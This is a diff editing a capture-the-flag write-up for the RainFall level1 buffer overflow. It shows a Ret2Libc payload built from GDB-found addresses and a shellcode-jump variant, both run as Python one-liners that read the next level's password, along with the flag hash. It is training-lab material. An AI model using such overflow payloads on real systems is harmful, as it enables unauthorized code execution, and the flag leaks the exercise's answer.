@@ -94,9 +94,8 @@ Ret2Libc (Return-to-Libc) is an exploit technique that redirects the program flo
 A typical Ret2Libc exploit is constructed as follows:
 ```
 padding + address of system + address of exit + address of "/bin/sh"
-
-The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.
 ```
+> The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.
 
 #### Exploit
 We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:
@@ -106,11 +105,12 @@ We, therefore, need the addresses of the `system`, `exit` functions and the stri
 (gdb) info function system
 0x08048360  system
 0x08048360  system@plt
+[...]
 
 # Exit
 (gdb) info function exit
 0xb7e5ebe0  exit
-0xb7e5ec10  on_exit
+[...]
 
 # /bin/sh
 (gdb) info proc mappings
@@ -131,8 +131,7 @@ reminder: padding + address of system + address of exit + address of "/bin/sh"
 
 Let's run it:
 ```bash
-level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x83\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[:
-:-1])' && echo 'cat /home/user/level2/.pass') | ./level1
+level1@RainFall:~$ (python -c 'print("\x90"*76 + "\x08\x04\x83\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
@@ -176,12 +175,12 @@ Alright, let's craft our payload:
 ```
 padding + address of shellcode
 
-"\x90"*76 + "\x08\x04\xa0\x08"[::-1]
+"\x90"*76 + "\xbf\xff\xf8\x48"
 ```
 
 Let's run it:
 ```bash
-level1@RainFall:~$ (python -c 'print("0"*76 + "\xbf\xff\xf8\x48"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
+level1@RainFall:~$ (python -c 'print("\x90"*76 + "\xbf\xff\xf8\x48"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
